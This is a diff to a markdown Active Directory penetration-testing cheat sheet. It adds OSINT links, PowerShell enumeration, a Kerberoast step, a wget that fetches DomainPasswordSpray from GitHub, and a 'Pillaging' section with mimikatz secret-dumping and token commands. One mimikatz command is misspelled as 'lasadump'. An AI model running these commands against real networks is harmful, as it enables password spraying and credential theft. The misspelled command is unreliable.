@@ -14,14 +14,9 @@
 [Linkedin2Username](https://github.com/initstring/linkedin2username)
 [DeHashed](https://dehashed.com/search#breachCheck)
 [HaveIBeenPwned](https://haveibeenpwned.com/)
-#### Public-facing websites 
-#### loud & Dev Storage Spaces 
-#### Have I Been Pwned
-#### BGP-Toolkit 
+- Public Websites 
+- Google Dorking
 ## Internal Enumeration 
-```
-Get-Module 
-```
 
 ```
 Import-Module ActiveDirectory 
@@ -153,6 +148,7 @@ Find Computers where Domain Users are Local Admin
 ## Privilege Escalation 
 ## Exploitation (from Linux)
 ## Exploitation (from Windows )
+
 ### Kerberoast 
 ```
 Import-Module .\PowerView.ps1
@@ -166,3 +162,9 @@ wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/Domai
 Import-Module .\DomainPasswordSpray.ps1
 ```
 tag:lateral-movement
+
+## Pillaging 
+```
+mimikatz.exe 
+lasadump::secrets
+token::elevate
